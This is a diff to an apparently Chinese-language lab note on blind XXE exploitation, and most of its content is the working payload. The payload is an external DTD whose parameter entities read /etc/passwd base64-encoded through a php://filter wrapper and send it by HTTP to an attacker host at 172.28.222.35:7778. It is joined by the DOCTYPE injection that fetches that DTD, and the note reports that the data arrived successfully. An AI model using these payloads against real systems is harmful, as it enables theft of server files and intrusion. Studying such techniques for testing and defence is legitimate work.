@@ -57,13 +57,14 @@ Connection: close
 
 首先在1.dtd写好嵌套php伪协议的file协议读取/passwd
 ```dtd
-<!ENTITY %file SYSTEM "php://filter/read=convert.base64-encode/resource=file:///etc/passwd">
-<!ENTITY %guc "<!ENTITY &#37; send SYSTEM 'http://172.28.222.35:7778/?p=%file;'>">
+<!ENTITY % file SYSTEM "php://filter/read=convert.base64-encode/resource=file:///etc/passwd">
+<!ENTITY % guc "<!ENTITY &#37; send SYSTEM 'http://172.28.222.35:7778/?p=%file;'>">
 ```
-### 注意
+### 注意 定义参数实体% xxxx有空格
 后面的&#37;实际上就是参数实体内不能在直接写% send，否则会被提前解析
 因此用&#37;代替%
 最后用参数实体 send 把%file的值get提交
+实际上用到的分别是%guc(获取dtd) %sky(嵌套) %file(内部) %send(发送)
 
 ### 最后
 在响应包提交的时候
@@ -71,3 +72,7 @@ Connection: close
 ```dtd
 <!DOCTYPE conver [<!ENTITY % sky SYSTEM "http://172.28.222.35:7777/1.dtd"> %sky;%guc;%send;]>
 ```
+
+![](assets/无回显XXE/file-20260106102029281.png)
+
+成功发送到了7778端口，只需要解码base64即可
